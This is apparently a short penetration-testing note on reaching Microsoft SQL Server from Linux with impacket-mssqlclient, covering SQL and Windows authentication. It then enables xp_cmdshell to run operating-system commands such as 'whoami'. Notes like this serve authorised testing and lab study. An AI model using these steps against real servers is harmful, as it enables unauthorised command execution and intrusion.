# From Linux 
## Using impacket-mssqlclient
```shell
impacket-mssqlclient  'Domain/user':'Password'@<SQLServer-IP> -dc-ip <DC-IP>
impacket-mssqlclient  'Domain/user':'Password'@<SQLServer-IP> -dc-ip <DC-IP> -windows-auth
```
Or 
```shell
impacket-mssqlclient <user>:'Password'@<SQLServer-IP>
impacket-mssqlclient <user>:'Password'@<SQLServer-IP> -windows-auth
```
**NOTE**: 
- `-windows-auth` → AD/Windows authentication (NTLM).
- Without `it`   → SQL Server authentication (local SQL logins).
If you have both AD credentials and SQL logins, try both modes, because many SQL servers allow mixed authentication.

Enable execute commands
```shell
enable_xp_cmdshell
xp_cmdshell "whoami"
```


